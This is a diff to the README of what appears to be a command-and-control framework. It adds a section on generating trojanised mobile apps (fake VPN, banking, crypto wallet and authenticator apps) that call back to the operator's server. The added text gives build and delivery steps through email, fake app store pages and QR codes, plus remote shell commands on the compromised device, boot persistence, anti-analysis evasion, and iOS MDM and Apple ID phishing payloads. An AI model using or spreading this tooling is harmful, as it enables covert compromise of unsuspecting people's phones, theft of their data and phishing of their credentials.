@@ -41,6 +41,15 @@
 ### Payload Generation
 ![Generate](docs/assets/screenshot-generate.png)
 
+### Mobile App Builder (30+ Templates)
+![App Templates](docs/assets/screenshot-app-templates.png)
+
+### Mobile Payload Generation (Android + iOS)
+![Mobile Payloads](docs/assets/screenshot-mobile-payloads.png)
+
+### Mobile Agent Callback
+![Mobile Callback](docs/assets/screenshot-mobile-callback.png)
+
 ### All Commands (35+)
 ![Help](docs/assets/screenshot-help.png)
 
@@ -356,6 +365,79 @@ phantom > generate vba https://your-c2.com:443
 | `python` | Cross-platform | SSL-capable stager |
 | `hta` | Windows | Phishing payload (base64 PS cradle) |
 | `vba` | Windows | Office macro (AutoOpen) |
+
+---
+
+## Mobile Payloads (Android + iOS)
+
+### Quick Start — Android App with C2 Callback
+
+```bash
+# Step 1: Generate a fake VPN app
+phantom > generate app vpn-shield https://YOUR-C2-IP:8080
+
+# Step 2: Build the APK
+cd build/payloads/apps/vpn_shield
+# Open in Android Studio → Build → Build APK
+# Or: gradle assembleRelease
+
+# Step 3: Deliver to target
+# - Send APK via email/message
+# - Host on fake app store page
+# - QR code linking to download
+
+# Step 4: When target installs and opens the app
+# - They see a legitimate VPN interface
+# - Background service starts C2 callback
+# - Agent appears in Phantom: "phantom > agents"
+
+# Step 5: Interact with mobile agent
+phantom > interact toxic-cobra
+phantom [toxic-cobra] > shell id
+phantom [toxic-cobra] > sysinfo
+phantom [toxic-cobra] > shell cat /proc/version
+```
+
+### Available App Templates (30+)
+
+| Category | Templates |
+|----------|-----------|
+| Productivity | Calculator, QR Scanner, PDF Viewer, Notes, File Manager |
+| Utility | Flashlight, WiFi Analyzer, Battery Saver, Cleaner, Speed Test |
+| Security | VPN Shield, Password Manager, Authenticator, Antivirus Pro |
+| Finance | Crypto Wallet, Banking App, Expense Tracker |
+| Social | Chat Messenger, Video Call, Dating Connect |
+| Entertainment | Music Player, Live TV, Game Hub |
+| Corporate | Company Portal, HR Self-Service, IT Support |
+
+### What Each App Includes
+
+- **Realistic UI** — category-specific interface (banking dashboard, security shield, etc.)
+- **Background C2 service** — survives app close, runs silently
+- **Boot persistence** — auto-starts when device reboots
+- **Remote shell** — execute commands on the device
+- **Device info** — model, OS, manufacturer, device ID
+- **Evasion suite** — anti-emulator, anti-debug, anti-Frida, anti-AV, sandbox timing delay
+
+### Other Mobile Payloads
+
+```bash
+# Android-specific payloads (stagers + phishing)
+phantom > generate android https://YOUR-C2-IP:8080
+
+# iOS-specific payloads (MDM profile + Apple ID phishing)
+phantom > generate ios https://YOUR-C2-IP:8080
+```
+
+### Mobile Evasion (Auto-Included)
+
+All generated apps automatically include evasion that:
+- Detects emulators (Genymotion, Nox, BlueStacks, QEMU)
+- Detects security apps (25+ AV/MDM packages)
+- Detects Frida instrumentation (3 detection methods)
+- Detects debuggers and analysis tools
+- Delays C2 callback 60-120s to outlast sandbox analysis
+- Stays fully dormant if any analysis is detected
 
 ---
 
